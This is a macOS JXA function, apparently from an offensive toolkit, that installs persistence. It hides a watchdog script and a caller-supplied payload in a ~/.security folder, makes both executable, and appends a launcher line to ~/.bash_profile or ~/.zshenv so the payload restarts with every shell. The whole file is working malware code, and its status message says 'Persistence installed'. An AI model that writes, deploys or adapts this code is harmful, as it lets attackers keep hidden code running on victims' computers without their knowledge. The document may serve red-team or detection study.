function BashProfilePersist (persist) {

ObjC.import('Foundation')
ObjC.import("Cocoa");
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true;

var userHome = $.getenv('HOME')
var sysVers = app.systemInfo().systemVersion
var output = ""
try{
function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            app.setEof(openedFile, { to: 0 })
        }
        app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
        app.closeAccess(openedFile)
}

//PLACEHOLDER: change based on which process you want to monitor for (e.g. osascript)
var payload =
`RUNNING=$(ps ax | grep osascript | wc -l);
if [ "$RUNNING" -lt 2 ]
then
  cd `+ userHome + `/.security
  ./update.sh &
else
  exit
fi`

var profile = userHome + `/.security/apple.sh`

function createFolder(path) {
    $.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(path, false, $(),$())
			}

var hiddenPath = ``+ userHome + `/.security`
isDir=Ref()
var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath,isDir)
if (hiddenDirectoryExistsCheck == false) {
	createFolder(hiddenPath)
					}

var payloadPath = userHome + '/.security/apple.sh'
writeTextToFile(payload, payloadPath, true)

var persistPath = userHome + '/.security/update.sh'
writeTextToFile(persist, persistPath, true)

function executeBackground(actionPath){
	var path = "/bin/chmod"
	var args = ["+x",actionPath,"&"]
	var pipe = $.NSPipe.pipe;
	var file = pipe.fileHandleForReading;
	var task = $.NSTask.alloc.init;
	task.launchPath = path;
	task.arguments = args;
	task.standardOutput = pipe; 
	task.standardError = pipe;
	task.launch; 
	}
	
executeBackground(payloadPath)
executeBackground(persistPath)
	
if (sysVers < "10.15.0") {
profilePath = userHome + '/.bash_profile'
writeTextToFile(profile, profilePath, false)
output += "Persistence installed at " + userHome + '/.bash_profile' + ", " + userHome + '/.security/apple.sh' + ",and " + userHome + '/.security/apple.sh'
} else {
profilePath = userHome + '/.zshenv'
writeTextToFile(profile, profilePath, false)
output += "Persistence installed at " + userHome + '/.zshenv' + " , " + userHome + '/.security/apple.sh' + ",and " + userHome + '/.security/apple.sh'
	}

}catch(error){
       output += error.toString()
		}
	return output
}
